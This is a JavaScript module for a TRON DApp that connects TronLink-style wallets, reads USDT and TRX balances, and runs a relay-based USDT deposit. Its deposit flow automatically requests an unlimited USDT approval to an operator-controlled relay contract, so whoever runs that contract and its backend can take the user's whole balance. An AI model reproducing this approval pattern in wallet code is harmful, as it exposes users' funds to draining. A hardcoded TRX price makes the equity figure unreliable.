/**
 * TRON 钱包连接工具函数
 * 
 * 支持的钱包：
 * - TronLink
 * - TokenPocket (TRON)
 * - imToken (TRON)
 * 
 * 使用方式：
 * 用户通过钱包内置浏览器访问 DApp，自动检测并连接TRON钱包
 */

import { useWalletStore } from '@/stores/wallet'

// ==================== TRON 配置 ====================

// USDT (TRC-20) 合约地址
const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'

// DepositRelay 合约地址
const DEPOSIT_RELAY_CONTRACT = 'TP9z9rU1gzvGz1GmvvYmFQjGNzZajPaiEM'

// ==================== 检测函数 ====================

/**
 * 检测是否在 TRON DApp 浏览器环境中
 * @returns {boolean} 是否在 TRON DApp 浏览器中
 */
export const isTronDAppBrowser = () => {
  if (typeof window === 'undefined') {
    return false
  }
  
  // 检查 User Agent 是否包含 TRON 钱包标识
  const ua = navigator.userAgent.toLowerCase()
  const isTronWallet = ua.includes('tronlink') || 
                       ua.includes('tokenpocket') || 
                       ua.includes('imtoken')
  
  // 如果是 TRON 钱包浏览器，即使 tronWeb 还没注入也返回 true
  if (isTronWallet) {
    return true
  }
  
  // 否则检查 tronWeb 是否存在
  return !!window.tronWeb
}

/**
 * 检测 TRON 钱包类型
 * @returns {string} 钱包类型名称
 */
export const detectTronWalletType = () => {
  if (typeof window === 'undefined' || !window.tronWeb) {
    return 'Unknown'
  }

  // 检测 TronLink
  if (window.tronLink) {
    console.log('[TronWallet] ✅ Detected: TronLink')
    return 'TronLink'
  }

  // 检测 TokenPocket (TRON)
  const ua = navigator.userAgent.toLowerCase()
  if (ua.includes('tokenpocket')) {
    console.log('[TronWallet] ✅ Detected: TokenPocket (TRON)')
    return 'TokenPocket'
  }

  // 检测 imToken (TRON)
  if (ua.includes('imtoken')) {
    console.log('[TronWallet] ✅ Detected: imToken (TRON)')
    return 'imToken'
  }

  console.log('[TronWallet] ✅ Detected: Unknown TRON Wallet')
  return 'TRON Wallet'
}

/**
 * 等待 TronWeb 准备就绪
 * @param {number} timeout - 超时时间（毫秒）
 * @returns {Promise<boolean>}
 */
const waitForTronWeb = (timeout = 5000) => {
  return new Promise((resolve) => {
    // 检查 tronWeb 是否存在且有 defaultAddress
    const isTronWebReady = () => {
      return window.tronWeb && 
             window.tronWeb.defaultAddress && 
             window.tronWeb.defaultAddress.base58
    }

    if (isTronWebReady()) {
      console.log('[TronWallet] TronWeb already ready')
      resolve(true)
      return
    }

    console.log('[TronWallet] Waiting for TronWeb...')
    const startTime = Date.now()
    let resolved = false
    
    const checkInterval = setInterval(() => {
      if (resolved) {
        clearInterval(checkInterval)
        return
      }
      
      if (isTronWebReady()) {
        resolved = true
        clearInterval(checkInterval)
        console.log('[TronWallet] TronWeb ready after', Date.now() - startTime, 'ms')
        resolve(true)
      } else if (Date.now() - startTime > timeout) {
        resolved = true
        clearInterval(checkInterval)
        // 静默处理超时，不显示警告（因为后续逻辑会继续尝试）
        resolve(false)
      }
    }, 50) // 更频繁的检查（50ms）
  })
}

// ==================== 连接函数 ====================

/**
 * 连接 TRON 钱包
 * @returns {Promise<{success: boolean, address?: string, error?: string}>}
 */
export const connectTronWallet = async () => {
  const walletStore = useWalletStore()

  // 检查是否在 TRON DApp 浏览器中
  if (!isTronDAppBrowser()) {
    return {
      success: false,
      error: 'Please open in TronLink or TRON wallet browser'
    }
  }

  try {
    walletStore.setConnecting(true)

    // 等待 TronWeb 准备就绪
    const ready = await waitForTronWeb()
    if (!ready) {
      return {
        success: false,
        error: 'TronWeb not ready, please refresh the page'
      }
    }

    const tronWeb = window.tronWeb
    const walletType = detectTronWalletType()

    // 请求用户授权连接钱包
    if (window.tronLink) {
      const res = await window.tronLink.request({ method: 'tron_requestAccounts' })
      if (res.code === 200) {
        const address = tronWeb.defaultAddress.base58
        walletStore.setWallet(address, walletType)
        walletStore.setChain('TRON')

        console.log('[TronWallet] Connected:', address)

        return {
          success: true,
          address: address,
          walletType: walletType
        }
      } else {
        return {
          success: false,
          error: 'User rejected the connection request'
        }
      }
    } else {
      // 其他 TRON 钱包（TokenPocket、imToken等）
      if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
        const address = tronWeb.defaultAddress.base58
        walletStore.setWallet(address, walletType)
        walletStore.setChain('TRON')

        console.log('[TronWallet] Connected:', address)

        return {
          success: true,
          address: address,
          walletType: walletType
        }
      } else {
        return {
          success: false,
          error: 'No TRON address found'
        }
      }
    }
  } catch (error) {
    console.error('[TronWallet] Connection error:', error)

    let errorMessage = 'Connection failed'
    if (error.message) {
      errorMessage = error.message
    }

    walletStore.setError(errorMessage)

    return {
      success: false,
      error: errorMessage
    }
  } finally {
    walletStore.setConnecting(false)
  }
}

/**
 * 获取当前连接的 TRON 账户
 * @returns {Promise<string|null>} 钱包地址或 null
 */
export const getCurrentTronAccount = async () => {
  if (!isTronDAppBrowser()) {
    return null
  }

  try {
    const ready = await waitForTronWeb()
    if (!ready) {
      return null
    }

    const tronWeb = window.tronWeb
    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
      return tronWeb.defaultAddress.base58
    }
    return null
  } catch (error) {
    console.error('[TronWallet] Get account error:', error)
    return null
  }
}

/**
 * 自动连接 TRON 钱包（如果用户之前已授权）
 */
export const autoConnectTronWallet = async () => {
  const walletStore = useWalletStore()

  // 首先尝试从 localStorage 恢复
  walletStore.restoreFromStorage()

  // 如果在 TRON DApp 浏览器中，检查是否已授权
  if (isTronDAppBrowser()) {
    try {
      const currentAccount = await getCurrentTronAccount()
      const walletType = detectTronWalletType()

      if (currentAccount) {
        // 如果有已授权的账户，更新状态
        walletStore.setWallet(currentAccount, walletType)
        walletStore.setChain('TRON')
        console.log('[TronWallet] Auto-connected:', currentAccount)
        return true
      }
    } catch (error) {
      console.error('[TronWallet] Auto-connect error:', error)
    }
  }

  return walletStore.isConnected
}

// ==================== 余额查询 ====================

/**
 * 获取 TRX 余额
 * @param {string} address - 钱包地址
 * @returns {Promise<string>} TRX 余额
 */
export const getTrxBalance = async (address) => {
  if (!isTronDAppBrowser() || !address) {
    return '0.0000'
  }

  try {
    const tronWeb = window.tronWeb
    const balance = await tronWeb.trx.getBalance(address)
    const trxBalance = tronWeb.fromSun(balance)
    return parseFloat(trxBalance).toFixed(4)
  } catch (error) {
    console.error('[TronWallet] Get TRX balance error:', error)
    return '0.0000'
  }
}

/**
 * 获取 USDT (TRC-20) 余额
 * @param {string} address - 钱包地址
 * @returns {Promise<string>} USDT 余额
 */
export const getTronUsdtBalance = async (address) => {
  if (!isTronDAppBrowser() || !address) {
    return '0.0000'
  }

  try {
    const tronWeb = window.tronWeb
    const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT)
    const balance = await contract.balanceOf(address).call()
    
    // USDT (TRC-20) 是 6 位小数
    const usdtBalance = balance.toNumber() / 1e6
    return usdtBalance.toFixed(4)
  } catch (error) {
    console.error('[TronWallet] Get USDT balance error:', error)
    return '0.0000'
  }
}

/**
 * 获取所有 TRON 代币余额
 * @param {string} address - 钱包地址
 * @returns {Promise<{usdt: string, trx: string, equity: string}>}
 */
export const getAllTronBalances = async (address) => {
  const walletStore = useWalletStore()
  
  walletStore.setLoadingBalance(true)

  try {
    // 并行获取所有余额
    const [usdt, trx] = await Promise.all([
      getTronUsdtBalance(address),
      getTrxBalance(address)
    ])

    // 计算总权益（USDT + TRX价值）
    const usdtNum = parseFloat(usdt) || 0
    const trxNum = parseFloat(trx) || 0
    // 假设 TRX 价格为 0.1 USDT（需要从实际API获取价格）
    const trxValue = trxNum * 0.1
    const equity = (usdtNum + trxValue).toFixed(4)

    // 更新 store
    walletStore.updateBalances({
      usdt,
      wld: '0.0000', // TRON 上没有 WLD
      equity,
      pnl: '+0.00'
    })

    console.log('[TronWallet] All balances fetched:', { usdt, trx, equity })

    return { usdt, trx, equity }
  } catch (error) {
    console.error('[TronWallet] Get all balances error:', error)
    return { usdt: '0.0000', trx: '0.0000', equity: '0.0000' }
  } finally {
    walletStore.setLoadingBalance(false)
  }
}

// ==================== 充值相关 ====================

/**
 * 检查用户是否已授权 USDT 给 DepositRelay 合约
 * @param {string} userAddress - 用户地址
 * @returns {Promise<{approved: boolean, allowance: string}>}
 */
export const checkTronDepositAllowance = async (userAddress) => {
  if (!isTronDAppBrowser() || !userAddress) {
    return { approved: false, allowance: '0' }
  }

  try {
    const tronWeb = window.tronWeb
    const usdtContract = await tronWeb.contract().at(TRON_USDT_CONTRACT)
    
    const allowance = await usdtContract.allowance(
      userAddress,
      DEPOSIT_RELAY_CONTRACT
    ).call()
    
    const allowanceUsdt = allowance.toNumber() / 1e6
    
    console.log('[TronWallet] Current allowance:', allowanceUsdt, 'USDT')
    
    return {
      approved: allowanceUsdt >= 20, // 至少20 USDT
      allowance: allowanceUsdt.toFixed(2)
    }
  } catch (error) {
    console.error('[TronWallet] Check allowance error:', error)
    return { approved: false, allowance: '0' }
  }
}

/**
 * 授权 USDT 给 DepositRelay 合约
 * @returns {Promise<{success: boolean, txHash?: string, error?: string}>}
 */
export const approveTronDepositRelay = async () => {
  if (!isTronDAppBrowser()) {
    return {
      success: false,
      error: 'Please open in TronLink or TRON wallet browser'
    }
  }

  try {
    const tronWeb = window.tronWeb
    const userAddress = tronWeb.defaultAddress.base58
    
    if (!userAddress) {
      return {
        success: false,
        error: 'No TRON address found'
      }
    }

    console.log('[TronWallet] Requesting USDT approval...')

    const usdtContract = await tronWeb.contract().at(TRON_USDT_CONTRACT)
    
    // 授权无限额度（最大uint256）
    const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
    
    const tx = await usdtContract.approve(
      DEPOSIT_RELAY_CONTRACT,
      maxUint256
    ).send({
      feeLimit: 100000000 // 100 TRX
    })

    console.log('[TronWallet] Approval transaction:', tx)

    return {
      success: true,
      txHash: tx
    }
  } catch (error) {
    console.error('[TronWallet] Approval error:', error)
    
    let errorMessage = 'Approval failed'
    if (error.message) {
      errorMessage = error.message
    }

    return {
      success: false,
      error: errorMessage
    }
  }
}

/**
 * 生成充值签名
 * @param {string} userAddress - 用户地址
 * @param {number} amount - 充值金额（USDT）
 * @param {string} nonce - 随机数
 * @returns {Promise<{success: boolean, signature?: string, error?: string}>}
 */
export const generateTronDepositSignature = async (userAddress, amount, nonce) => {
  if (!isTronDAppBrowser()) {
    return {
      success: false,
      error: 'Please open in TronLink or TRON wallet browser'
    }
  }

  try {
    const tronWeb = window.tronWeb
    
    // 转换金额为 Sun 单位（6位小数）
    const amountSun = Math.floor(amount * 1e6)
    
    // 构造消息哈希（与合约的 getMessageHash 一致）
    // keccak256(abi.encodePacked(user, amount, nonce))
    const userHex = tronWeb.address.toHex(userAddress).replace(/^41/, '0x')
    const amountHex = tronWeb.toHex(amountSun).replace('0x', '').padStart(64, '0')
    const nonceHex = nonce.replace('0x', '')
    
    const messageHash = tronWeb.sha3(userHex + amountHex + nonceHex, { encoding: 'hex' })
    
    console.log('[TronWallet] Message hash:', messageHash)
    
    // 签名
    const signature = await tronWeb.trx.sign(messageHash)
    
    console.log('[TronWallet] Signature generated')
    
    return {
      success: true,
      signature: signature
    }
  } catch (error) {
    console.error('[TronWallet] Signature error:', error)
    
    let errorMessage = 'Signature failed'
    if (error.message) {
      errorMessage = error.message
    }

    return {
      success: false,
      error: errorMessage
    }
  }
}

/**
 * 执行充值（完整流程）
 * @param {number} amount - 充值金额（USDT）
 * @returns {Promise<{success: boolean, txHash?: string, error?: string}>}
 */
export const depositWithTronRelay = async (amount) => {
  if (!isTronDAppBrowser()) {
    return {
      success: false,
      error: 'Please open in TronLink or TRON wallet browser'
    }
  }

  try {
    const tronWeb = window.tronWeb
    const userAddress = tronWeb.defaultAddress.base58
    
    if (!userAddress) {
      return {
        success: false,
        error: 'No TRON address found'
      }
    }

    // 步骤1：检查授权
    console.log('[TronWallet] Step 1: Checking allowance...')
    const { approved } = await checkTronDepositAllowance(userAddress)
    
    if (!approved) {
      console.log('[TronWallet] Not approved, requesting approval...')
      const approvalResult = await approveTronDepositRelay()
      
      if (!approvalResult.success) {
        return approvalResult
      }
      
      // 等待授权交易确认
      await new Promise(resolve => setTimeout(resolve, 3000))
    }

    // 步骤2：获取 nonce
    console.log('[TronWallet] Step 2: Getting nonce...')
    const nonceResponse = await fetch('/api/deposit/tron/nonce', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ wallet_address: userAddress })
    })
    
    const nonceData = await nonceResponse.json()
    
    if (!nonceData.success) {
      return {
        success: false,
        error: nonceData.message || 'Failed to get nonce'
      }
    }

    const nonce = nonceData.nonce

    // 步骤3：生成签名
    console.log('[TronWallet] Step 3: Generating signature...')
    const signatureResult = await generateTronDepositSignature(userAddress, amount, nonce)
    
    if (!signatureResult.success) {
      return signatureResult
    }

    // 步骤4：提交到后端执行充值
    console.log('[TronWallet] Step 4: Submitting deposit...')
    const depositResponse = await fetch('/api/deposit/tron/execute', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        wallet_address: userAddress,
        amount: amount,
        nonce: nonce,
        signature: signatureResult.signature
      })
    })

    const depositData = await depositResponse.json()

    if (!depositData.success) {
      return {
        success: false,
        error: depositData.message || 'Deposit failed'
      }
    }

    console.log('[TronWallet] ✅ Deposit successful!')

    return {
      success: true,
      txHash: depositData.txHash
    }
  } catch (error) {
    console.error('[TronWallet] Deposit error:', error)
    
    let errorMessage = 'Deposit failed'
    if (error.message) {
      errorMessage = error.message
    }

    return {
      success: false,
      error: errorMessage
    }
  }
}

// ==================== 监听器 ====================

/**
 * 监听 TRON 账户变化
 */
export const setupTronAccountChangeListener = () => {
  if (!isTronDAppBrowser()) {
    return
  }

  const walletStore = useWalletStore()

  // TronLink 账户变化监听
  if (window.tronLink) {
    window.addEventListener('message', (e) => {
      if (e.data.message && e.data.message.action === 'setAccount') {
        console.log('[TronWallet] Account changed')
        const address = e.data.message.data.address
        if (address) {
          const walletType = detectTronWalletType()
          walletStore.setWallet(address, walletType)
          walletStore.setChain('TRON')
        } else {
          walletStore.disconnect({
            clearBalances: true,
            clearPersistedBalances: true,
            clearWalletSession: true
          })
        }
      }
    })
  }
}

/**
 * 初始化 TRON 钱包连接
 */
export const initTronWallet = async () => {
  console.log('[TronWallet] Initializing...')

  // 设置监听器
  setupTronAccountChangeListener()

  // 尝试自动连接
  const connected = await autoConnectTronWallet()

  console.log('[TronWallet] Initialization complete, connected:', connected)

  return connected
}

export default {
  isTronDAppBrowser,
  detectTronWalletType,
  connectTronWallet,
  getCurrentTronAccount,
  autoConnectTronWallet,
  getTrxBalance,
  getTronUsdtBalance,
  getAllTronBalances,
  checkTronDepositAllowance,
  approveTronDepositRelay,
  generateTronDepositSignature,
  depositWithTronRelay,
  setupTronAccountChangeListener,
  initTronWallet
}
